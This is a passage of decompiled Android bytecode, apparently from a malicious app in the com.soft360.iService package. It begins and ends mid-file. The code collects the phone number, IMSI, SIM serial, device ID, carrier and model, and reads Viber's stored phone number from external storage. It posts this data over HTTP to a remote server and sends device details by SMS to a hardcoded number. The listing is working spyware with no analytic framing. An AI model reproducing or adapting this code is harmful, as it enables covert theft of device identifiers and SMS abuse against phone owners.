    //   1136	1256	1341	org/apache/http/client/ClientProtocolException
    //   1280	1304	1341	org/apache/http/client/ClientProtocolException
    //   1305	1329	1341	org/apache/http/client/ClientProtocolException
    //   133	408	1343	java/io/IOException
    //   408	470	1343	java/io/IOException
    //   470	477	1343	java/io/IOException
    //   482	561	1343	java/io/IOException
    //   562	800	1343	java/io/IOException
    //   803	817	1343	java/io/IOException
    //   820	832	1343	java/io/IOException
    //   839	846	1343	java/io/IOException
    //   851	855	1343	java/io/IOException
    //   857	861	1343	java/io/IOException
    //   863	867	1343	java/io/IOException
    //   868	875	1343	java/io/IOException
    //   880	884	1343	java/io/IOException
    //   886	890	1343	java/io/IOException
    //   892	896	1343	java/io/IOException
    //   897	909	1343	java/io/IOException
    //   910	922	1343	java/io/IOException
    //   923	947	1343	java/io/IOException
    //   948	974	1343	java/io/IOException
    //   975	1003	1343	java/io/IOException
    //   1004	1017	1343	java/io/IOException
    //   1018	1030	1343	java/io/IOException
    //   1031	1042	1343	java/io/IOException
    //   1043	1070	1343	java/io/IOException
    //   1071	1083	1343	java/io/IOException
    //   1084	1096	1343	java/io/IOException
    //   1097	1109	1343	java/io/IOException
    //   1110	1122	1343	java/io/IOException
    //   1123	1135	1343	java/io/IOException
    //   1136	1256	1343	java/io/IOException
    //   1280	1304	1343	java/io/IOException
    //   1305	1329	1343	java/io/IOException
  }
  
  /* Error */
  private void a(dU paramdU, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   3: istore_3
    //   4: aload_1
    //   5: ldc 45
    //   7: putfield 513	dU:h	Ljava/lang/String;
    //   10: aload_0
    //   11: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   14: invokevirtual 493	android/content/Context:getResources	()Landroid/content/res/Resources;
    //   17: ldc_w 514
    //   20: invokevirtual 518	android/content/res/Resources:getStringArray	(I)[Ljava/lang/String;
    //   23: arraylength
    //   24: iconst_1
    //   25: isub
    //   26: istore 5
    //   28: aload_0
    //   29: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   32: ifnull +34 -> 66
    //   35: aload_0
    //   36: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   39: astore 6
    //   41: aload 6
    //   43: invokestatic 523	et:a	(Landroid/content/Context;)Let;
    //   46: astore 8
    //   48: new 186	org/apache/http/impl/client/DefaultHttpClient
    //   51: dup
    //   52: invokespecial 187	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   55: astore 9
    //   57: aload 8
    //   59: invokevirtual 524	et:a	()Z
    //   62: ifne +12 -> 74
    //   65: return
    //   66: getstatic 525	com/soft360/iService/AService:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   69: astore 6
    //   71: goto -30 -> 41
    //   74: aload 9
    //   76: invokeinterface 193 1 0
    //   81: ldc -61
    //   83: ldc -59
    //   85: invokeinterface 203 3 0
    //   90: pop
    //   91: aload 9
    //   93: invokeinterface 193 1 0
    //   98: ldc_w 527
    //   101: new 478	java/lang/Integer
    //   104: dup
    //   105: sipush 1000
    //   108: invokespecial 530	java/lang/Integer:<init>	(I)V
    //   111: invokeinterface 203 3 0
    //   116: pop
    //   117: aload_0
    //   118: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   121: ldc_w 531
    //   124: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   127: astore 6
    //   129: aload_1
    //   130: getfield 209	dU:a	LcD;
    //   133: astore 7
    //   135: new 50	java/lang/String
    //   138: dup
    //   139: aload 6
    //   141: invokestatic 211	cD:a	(Ljava/lang/String;)Ljava/lang/String;
    //   144: invokespecial 212	java/lang/String:<init>	(Ljava/lang/String;)V
    //   147: astore 7
    //   149: aload 7
    //   151: astore 6
    //   153: new 222	org/apache/http/client/methods/HttpPost
    //   156: dup
    //   157: new 83	java/lang/StringBuilder
    //   160: dup
    //   161: aload_1
    //   162: iload_3
    //   163: invokevirtual 217	dU:a	(I)Ljava/lang/String;
    //   166: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   169: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   172: aload 6
    //   174: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   177: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   180: invokespecial 223	org/apache/http/client/methods/HttpPost:<init>	(Ljava/lang/String;)V
    //   183: astore 6
    //   185: aload 9
    //   187: aload 6
    //   189: invokeinterface 303 2 0
    //   194: astore 6
    //   196: aload 6
    //   198: invokeinterface 535 1 0
    //   203: invokeinterface 540 1 0
    //   208: sipush 200
    //   211: if_icmpne +628 -> 839
    //   214: new 297	java/io/BufferedReader
    //   217: dup
    //   218: new 299	java/io/InputStreamReader
    //   221: dup
    //   222: aload 6
    //   224: invokeinterface 309 1 0
    //   229: invokeinterface 315 1 0
    //   234: ldc -59
    //   236: invokespecial 318	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;Ljava/lang/String;)V
    //   239: invokespecial 321	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   242: invokevirtual 325	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   245: ldc_w 542
    //   248: invokevirtual 246	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   251: ifeq +588 -> 839
    //   254: aload_0
    //   255: bipush 10
    //   257: putfield 23	eu:jdField_a_of_type_Int	I
    //   260: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   263: iload_3
    //   264: if_icmpeq -199 -> 65
    //   267: iload_2
    //   268: ifeq +309 -> 577
    //   271: aload 9
    //   273: invokeinterface 193 1 0
    //   278: ldc -61
    //   280: ldc -59
    //   282: invokeinterface 203 3 0
    //   287: pop
    //   288: aload_0
    //   289: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   292: ldc_w 543
    //   295: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   298: astore 6
    //   300: aload_1
    //   301: getfield 209	dU:a	LcD;
    //   304: astore 7
    //   306: new 50	java/lang/String
    //   309: dup
    //   310: aload 6
    //   312: invokestatic 211	cD:a	(Ljava/lang/String;)Ljava/lang/String;
    //   315: invokespecial 212	java/lang/String:<init>	(Ljava/lang/String;)V
    //   318: astore 6
    //   320: new 222	org/apache/http/client/methods/HttpPost
    //   323: dup
    //   324: new 83	java/lang/StringBuilder
    //   327: dup
    //   328: aload_1
    //   329: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   332: invokevirtual 217	dU:a	(I)Ljava/lang/String;
    //   335: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   338: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   341: aload 6
    //   343: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   346: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   349: invokespecial 223	org/apache/http/client/methods/HttpPost:<init>	(Ljava/lang/String;)V
    //   352: astore 6
    //   354: new 238	java/util/ArrayList
    //   357: dup
    //   358: invokespecial 239	java/util/ArrayList:<init>	()V
    //   361: astore 7
    //   363: aload 7
    //   365: new 248	org/apache/http/message/BasicNameValuePair
    //   368: dup
    //   369: ldc -6
    //   371: aload_1
    //   372: invokevirtual 252	dU:b	()Ljava/lang/String;
    //   375: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   378: invokeinterface 260 2 0
    //   383: pop
    //   384: aload 7
    //   386: new 248	org/apache/http/message/BasicNameValuePair
    //   389: dup
    //   390: ldc_w 545
    //   393: aload_0
    //   394: invokespecial 546	eu:b	()Ljava/lang/String;
    //   397: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   400: invokeinterface 260 2 0
    //   405: pop
    //   406: aload 7
    //   408: new 248	org/apache/http/message/BasicNameValuePair
    //   411: dup
    //   412: ldc_w 548
    //   415: aload_0
    //   416: invokespecial 550	eu:d	()Ljava/lang/String;
    //   419: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   422: invokeinterface 260 2 0
    //   427: pop
    //   428: aload 7
    //   430: new 248	org/apache/http/message/BasicNameValuePair
    //   433: dup
    //   434: ldc_w 552
    //   437: invokestatic 554	eu:e	()Ljava/lang/String;
    //   440: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   443: invokeinterface 260 2 0
    //   448: pop
    //   449: aload 7
    //   451: new 248	org/apache/http/message/BasicNameValuePair
    //   454: dup
    //   455: ldc_w 262
    //   458: aload_0
    //   459: invokevirtual 264	eu:a	()Ljava/lang/String;
    //   462: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   465: invokeinterface 260 2 0
    //   470: pop
    //   471: aload 7
    //   473: new 248	org/apache/http/message/BasicNameValuePair
    //   476: dup
    //   477: ldc_w 278
    //   480: aload_0
    //   481: invokespecial 281	eu:f	()Ljava/lang/String;
    //   484: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   487: invokeinterface 260 2 0
    //   492: pop
    //   493: aload 7
    //   495: new 248	org/apache/http/message/BasicNameValuePair
    //   498: dup
    //   499: ldc_w 556
    //   502: new 83	java/lang/StringBuilder
    //   505: dup
    //   506: ldc_w 558
    //   509: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   512: getstatic 563	android/os/Build$VERSION:RELEASE	Ljava/lang/String;
    //   515: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   518: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   521: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   524: invokeinterface 260 2 0
    //   529: pop
    //   530: aload 7
    //   532: new 248	org/apache/http/message/BasicNameValuePair
    //   535: dup
    //   536: ldc_w 283
    //   539: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   542: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   545: invokeinterface 260 2 0
    //   550: pop
    //   551: aload 6
    //   553: new 288	org/apache/http/client/entity/UrlEncodedFormEntity
    //   556: dup
    //   557: aload 7
    //   559: ldc -59
    //   561: invokespecial 291	org/apache/http/client/entity/UrlEncodedFormEntity:<init>	(Ljava/util/List;Ljava/lang/String;)V
    //   564: invokevirtual 295	org/apache/http/client/methods/HttpPost:setEntity	(Lorg/apache/http/HttpEntity;)V
    //   567: aload 9
    //   569: aload 6
    //   571: invokeinterface 303 2 0
    //   576: pop
    //   577: new 83	java/lang/StringBuilder
    //   580: dup
    //   581: ldc_w 565
    //   584: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   587: aload_1
    //   588: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   591: invokevirtual 567	dU:b	(I)Ljava/lang/String;
    //   594: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   597: ldc_w 569
    //   600: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   603: iload_2
    //   604: invokevirtual 572	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   607: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   610: pop
    //   611: invokestatic 578	android/telephony/SmsManager:getDefault	()Landroid/telephony/SmsManager;
    //   614: astore 6
    //   616: new 83	java/lang/StringBuilder
    //   619: dup
    //   620: ldc_w 580
    //   623: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   626: aload_1
    //   627: invokevirtual 252	dU:b	()Ljava/lang/String;
    //   630: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   633: ldc_w 582
    //   636: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   639: aload_1
    //   640: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   643: invokevirtual 567	dU:b	(I)Ljava/lang/String;
    //   646: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   649: ldc_w 584
    //   652: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   655: aload_1
    //   656: iload_3
    //   657: invokevirtual 567	dU:b	(I)Ljava/lang/String;
    //   660: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   663: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   666: astore 7
    //   668: aload 6
    //   670: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   673: aconst_null
    //   674: aload 7
    //   676: aconst_null
    //   677: aconst_null
    //   678: invokevirtual 588	android/telephony/SmsManager:sendTextMessage	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    //   681: iload_3
    //   682: putstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   685: aload_0
    //   686: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   689: invokevirtual 592	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   692: invokestatic 459	android/preference/PreferenceManager:getDefaultSharedPreferences	(Landroid/content/Context;)Landroid/content/SharedPreferences;
    //   695: invokeinterface 465 1 0
    //   700: astore 6
    //   702: aload 6
    //   704: ldc_w 594
    //   707: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   710: invokeinterface 598 3 0
    //   715: pop
    //   716: aload 6
    //   718: invokeinterface 476 1 0
    //   723: pop
    //   724: return
    //   725: astore 6
    //   727: aload_0
    //   728: aload_0
    //   729: getfield 23	eu:jdField_a_of_type_Int	I
    //   732: iconst_1
    //   733: isub
    //   734: putfield 23	eu:jdField_a_of_type_Int	I
    //   737: aload_0
    //   738: getfield 23	eu:jdField_a_of_type_Int	I
    //   741: ifgt -676 -> 65
    //   744: aload_0
    //   745: bipush 10
    //   747: putfield 23	eu:jdField_a_of_type_Int	I
    //   750: new 83	java/lang/StringBuilder
    //   753: dup
    //   754: ldc_w 600
    //   757: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   760: aload_1
    //   761: getfield 513	dU:h	Ljava/lang/String;
    //   764: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   767: ldc_w 602
    //   770: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   773: aload 6
    //   775: invokevirtual 603	java/lang/Exception:toString	()Ljava/lang/String;
    //   778: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   781: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   784: pop
    //   785: iload_3
    //   786: iconst_1
    //   787: iadd
    //   788: istore 4
    //   790: iload 4
    //   792: istore_3
    //   793: iload 4
    //   795: iload 5
    //   797: if_icmple +103 -> 900
    //   800: iconst_0
    //   801: putstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   804: aload_1
    //   805: aload_0
    //   806: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   809: invokevirtual 592	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   812: invokestatic 459	android/preference/PreferenceManager:getDefaultSharedPreferences	(Landroid/content/Context;)Landroid/content/SharedPreferences;
    //   815: ldc_w 605
    //   818: ldc 45
    //   820: invokeinterface 608 3 0
    //   825: putfield 513	dU:h	Ljava/lang/String;
    //   828: return
    //   829: astore 7
    //   831: aload 7
    //   833: invokevirtual 372	java/lang/Exception:printStackTrace	()V
    //   836: goto -683 -> 153
    //   839: iload_3
    //   840: iconst_1
    //   841: iadd
    //   842: istore 4
    //   844: iload 4
    //   846: istore_3
    //   847: iload 4
    //   849: iload 5
    //   851: if_icmple +49 -> 900
    //   854: iconst_0
    //   855: putstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   858: aload_1
    //   859: aload_0
    //   860: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   863: invokevirtual 592	android/content/Context:getApplicationContext	()Landroid/content/Context;
    //   866: invokestatic 459	android/preference/PreferenceManager:getDefaultSharedPreferences	(Landroid/content/Context;)Landroid/content/SharedPreferences;
    //   869: ldc_w 605
    //   872: ldc 45
    //   874: invokeinterface 608 3 0
    //   879: putfield 513	dU:h	Ljava/lang/String;
    //   882: return
    //   883: astore 6
    //   885: iconst_0
    //   886: istore_3
    //   887: goto -160 -> 727
    //   890: astore 6
    //   892: goto -211 -> 681
    //   895: astore 6
    //   897: goto -320 -> 577
    //   900: goto -843 -> 57
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	903	0	this	eu
    //   0	903	1	paramdU	dU
    //   0	903	2	paramBoolean	boolean
    //   3	884	3	i	int
    //   788	64	4	j	int
    //   26	826	5	k	int
    //   39	678	6	localObject1	Object
    //   725	49	6	localException1	Exception
    //   883	1	6	localException2	Exception
    //   890	1	6	localException3	Exception
    //   895	1	6	localException4	Exception
    //   133	542	7	localObject2	Object
    //   829	3	7	localException5	Exception
    //   46	12	8	localet	et
    //   55	513	9	localDefaultHttpClient	org.apache.http.impl.client.DefaultHttpClient
    // Exception table:
    //   from	to	target	type
    //   185	267	725	java/lang/Exception
    //   271	354	725	java/lang/Exception
    //   681	724	725	java/lang/Exception
    //   129	149	829	java/lang/Exception
    //   854	882	883	java/lang/Exception
    //   577	681	890	java/lang/Exception
    //   354	577	895	java/lang/Exception
  }
  
  private String b()
  {
    Object localObject = c();
    if (!((String)localObject).equals("")) {
      return (String)localObject;
    }
    localObject = (TelephonyManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("phone");
    String str = ((TelephonyManager)localObject).getLine1Number();
    jdField_a_of_type_JavaLangString = str;
    if ((str == null) || (jdField_a_of_type_JavaLangString.toString().trim().isEmpty())) {
      jdField_a_of_type_JavaLangString = ((TelephonyManager)localObject).getSubscriberId();
    }
    return jdField_a_of_type_JavaLangString;
  }
  
  /* Error */
  private static String b(java.io.InputStream paramInputStream)
  {
    // Byte code:
    //   0: new 297	java/io/BufferedReader
    //   3: dup
    //   4: new 299	java/io/InputStreamReader
    //   7: dup
    //   8: aload_0
    //   9: invokespecial 630	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   12: invokespecial 321	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   15: astore_2
    //   16: new 83	java/lang/StringBuilder
    //   19: dup
    //   20: invokespecial 322	java/lang/StringBuilder:<init>	()V
    //   23: astore_1
    //   24: aload_2
    //   25: invokevirtual 325	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   28: astore_3
    //   29: aload_3
    //   30: ifnonnull +12 -> 42
    //   33: aload_0
    //   34: invokevirtual 635	java/io/InputStream:close	()V
    //   37: aload_1
    //   38: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   41: areturn
    //   42: aload_1
    //   43: new 83	java/lang/StringBuilder
    //   46: dup
    //   47: aload_3
    //   48: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   51: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   54: ldc_w 358
    //   57: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   60: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   63: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   66: pop
    //   67: goto -43 -> 24
    //   70: astore_2
    //   71: aload_2
    //   72: invokevirtual 636	java/io/IOException:printStackTrace	()V
    //   75: aload_0
    //   76: invokevirtual 635	java/io/InputStream:close	()V
    //   79: goto -42 -> 37
    //   82: astore_0
    //   83: aload_0
    //   84: invokevirtual 636	java/io/IOException:printStackTrace	()V
    //   87: goto -50 -> 37
    //   90: astore_1
    //   91: aload_0
    //   92: invokevirtual 635	java/io/InputStream:close	()V
    //   95: aload_1
    //   96: athrow
    //   97: astore_0
    //   98: aload_0
    //   99: invokevirtual 636	java/io/IOException:printStackTrace	()V
    //   102: goto -7 -> 95
    //   105: astore_0
    //   106: aload_0
    //   107: invokevirtual 636	java/io/IOException:printStackTrace	()V
    //   110: goto -73 -> 37
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	113	0	paramInputStream	java.io.InputStream
    //   23	20	1	localStringBuilder	StringBuilder
    //   90	6	1	localObject	Object
    //   15	10	2	localBufferedReader	BufferedReader
    //   70	2	2	localIOException	IOException
    //   28	20	3	str	String
    // Exception table:
    //   from	to	target	type
    //   24	29	70	java/io/IOException
    //   42	67	70	java/io/IOException
    //   75	79	82	java/io/IOException
    //   24	29	90	finally
    //   42	67	90	finally
    //   71	75	90	finally
    //   91	95	97	java/io/IOException
    //   33	37	105	java/io/IOException
  }
  
  private static String c()
  {
    Object localObject2 = new File(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/viber/"), ".userdata");
    if (((File)localObject2).exists())
    {
      Object localObject1 = new StringBuilder();
      for (;;)
      {
        try
        {
          localObject2 = new BufferedReader(new FileReader((File)localObject2));
          str = ((BufferedReader)localObject2).readLine();
          if (str == null) {
            localObject1 = new JSONTokener(((StringBuilder)localObject1).toString());
          }
        }
        catch (IOException localIOException)
        {
          String str;
          return "";
        }
        try
        {
          localObject1 = new JSONObject((JSONTokener)localObject1);
          new StringBuilder().append(((JSONObject)localObject1).getString("canonized_number")).toString();
          localObject1 = ((JSONObject)localObject1).getString("canonized_number");
          return (String)localObject1;
        }
        catch (JSONException localJSONException)
        {
          return "";
        }
        ((StringBuilder)localObject1).append(str);
      }
    }
    return "";
  }
  
  private String d()
  {
    return ((TelephonyManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("phone")).getSimSerialNumber();
  }
  
  private static String e()
  {
    String str1 = Build.MANUFACTURER;
    String str2 = Build.MODEL;
    if (str2.startsWith(str1)) {
      return a(str2);
    }
    return a(str1) + " " + str2;
  }
  
  private String f()
  {
    try
    {
      String str = ((TelephonyManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("phone")).getNetworkOperatorName();
      return str;
    }
    catch (Exception localException) {}
    return "undefine";
  }
  
  public final String a()
  {
    return ((TelephonyManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("phone")).getDeviceId();
  }
  
  /* Error */
  public final void a()
  {
    // Byte code:
    //   0: aconst_null
    //   1: invokestatic 692	dU:a	(Landroid/content/Context;)LdU;
    //   4: astore 4
    //   6: aload 4
    //   8: invokevirtual 693	dU:m	()Z
    //   11: ifeq +4 -> 15
    //   14: return
    //   15: invokestatic 578	android/telephony/SmsManager:getDefault	()Landroid/telephony/SmsManager;
    //   18: astore 5
    //   20: aload_0
    //   21: getfield 21	eu:b	I
    //   24: iconst_1
    //   25: if_icmple +196 -> 221
    //   28: new 83	java/lang/StringBuilder
    //   31: dup
    //   32: ldc_w 580
    //   35: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   38: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   41: ldc_w 695
    //   44: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   47: aload_0
    //   48: invokespecial 550	eu:d	()Ljava/lang/String;
    //   51: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: ldc_w 697
    //   57: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   60: invokestatic 554	eu:e	()Ljava/lang/String;
    //   63: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   66: ldc_w 699
    //   69: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   72: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   75: astore_2
    //   76: aload 5
    //   78: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   81: aconst_null
    //   82: aload_2
    //   83: aconst_null
    //   84: aconst_null
    //   85: invokevirtual 588	android/telephony/SmsManager:sendTextMessage	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    //   88: aload_0
    //   89: aload_0
    //   90: getfield 21	eu:b	I
    //   93: iconst_1
    //   94: isub
    //   95: putfield 21	eu:b	I
    //   98: iconst_1
    //   99: invokestatic 704	java/lang/Boolean:valueOf	(Z)Ljava/lang/Boolean;
    //   102: astore_2
    //   103: aload_0
    //   104: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   107: ifnull +122 -> 229
    //   110: aload_0
    //   111: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   114: astore_3
    //   115: aload_3
    //   116: invokestatic 523	et:a	(Landroid/content/Context;)Let;
    //   119: invokevirtual 524	et:a	()Z
    //   122: ifne +114 -> 236
    //   125: aload_0
    //   126: getfield 21	eu:b	I
    //   129: ifle +80 -> 209
    //   132: aload_2
    //   133: invokevirtual 707	java/lang/Boolean:booleanValue	()Z
    //   136: ifne +73 -> 209
    //   139: new 83	java/lang/StringBuilder
    //   142: dup
    //   143: ldc_w 580
    //   146: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   149: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   152: ldc_w 695
    //   155: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: aload_0
    //   159: invokespecial 550	eu:d	()Ljava/lang/String;
    //   162: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   165: ldc_w 697
    //   168: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   171: invokestatic 554	eu:e	()Ljava/lang/String;
    //   174: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   177: ldc_w 699
    //   180: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   183: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   186: astore_2
    //   187: aload 5
    //   189: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   192: aconst_null
    //   193: aload_2
    //   194: aconst_null
    //   195: aconst_null
    //   196: invokevirtual 588	android/telephony/SmsManager:sendTextMessage	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    //   199: aload_0
    //   200: aload_0
    //   201: getfield 21	eu:b	I
    //   204: iconst_1
    //   205: isub
    //   206: putfield 21	eu:b	I
    //   209: new 709	java/net/ConnectException
    //   212: dup
    //   213: ldc_w 711
    //   216: invokespecial 712	java/net/ConnectException:<init>	(Ljava/lang/String;)V
    //   219: athrow
    //   220: astore_2
    //   221: iconst_0
    //   222: invokestatic 704	java/lang/Boolean:valueOf	(Z)Ljava/lang/Boolean;
    //   225: astore_2
    //   226: goto -123 -> 103
    //   229: getstatic 525	com/soft360/iService/AService:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   232: astore_3
    //   233: goto -118 -> 115
    //   236: aload_0
    //   237: aload 4
    //   239: iconst_0
    //   240: invokespecial 714	eu:a	(LdU;Z)V
    //   243: new 716	android/os/StrictMode$ThreadPolicy$Builder
    //   246: dup
    //   247: invokespecial 717	android/os/StrictMode$ThreadPolicy$Builder:<init>	()V
    //   250: invokevirtual 721	android/os/StrictMode$ThreadPolicy$Builder:permitAll	()Landroid/os/StrictMode$ThreadPolicy$Builder;
    //   253: invokevirtual 725	android/os/StrictMode$ThreadPolicy$Builder:build	()Landroid/os/StrictMode$ThreadPolicy;
    //   256: invokestatic 731	android/os/StrictMode:setThreadPolicy	(Landroid/os/StrictMode$ThreadPolicy;)V
    //   259: new 186	org/apache/http/impl/client/DefaultHttpClient
    //   262: dup
    //   263: invokespecial 187	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   266: astore_2
    //   267: aload_2
    //   268: invokeinterface 193 1 0
    //   273: ldc -61
    //   275: ldc -59
    //   277: invokeinterface 203 3 0
    //   282: pop
    //   283: aload_0
    //   284: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   287: ldc_w 543
    //   290: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   293: astore_3
    //   294: aload 4
    //   296: getfield 209	dU:a	LcD;
    //   299: astore 5
